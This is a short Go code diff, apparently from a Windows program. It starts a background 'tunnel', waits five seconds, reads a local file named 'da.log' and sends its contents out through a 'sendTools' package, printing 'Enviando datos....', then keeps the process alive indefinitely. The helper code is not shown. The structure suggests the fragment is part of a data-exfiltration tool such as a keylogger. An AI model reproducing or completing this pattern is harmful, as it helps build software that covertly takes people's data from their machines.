@@ -6,6 +6,7 @@ import (
 	//"net/http"
 	"windows/sendTools"
 	"windows/tunnel"
+	"time"
 )
 
 
@@ -13,21 +14,22 @@ func main(){
 	fmt.Println("ASJDLAJSLDJALKSDJLAKJSDLKASJDLKJALSDAKDLA")
 
 	
-	 re := tunnel.InitTunne()
-	 fmt.Println(re)
-	 if(re){
-	 	dat, err := os.ReadFile("da.log")
-		if(err != nil){
-			fmt.Println(err)
-		}
-		fmt.Println(string(dat))
-		sendTools.Send("Enviando datos....")
-		re := sendTools.Send(string(dat))
-		fmt.Println(re)
+	//re := tunnel.InitTunne()
+	go tunnel.InitTunne()
+
+	fmt.Println("Espera..")
+	time.Sleep(5*time.Second)
+
+	dat, err := os.ReadFile("da.log")
+	if(err != nil){
+		fmt.Println(err)
+	}
+	fmt.Println(string(dat))
+	sendTools.Send("Enviando datos....")
+	re := sendTools.Send(string(dat))
+	fmt.Println(re)
 		
-	 }else{
-		fmt.Println("Error")
-	 }
+	 
 	
 
 	//fmt.Println(tunnel.Command("linux", "hel"))
@@ -40,6 +42,7 @@ func main(){
 	// if(err != nil){
 	// 	fmt.Println(err)
 	// }
-	
+	select{}
 
 }
+
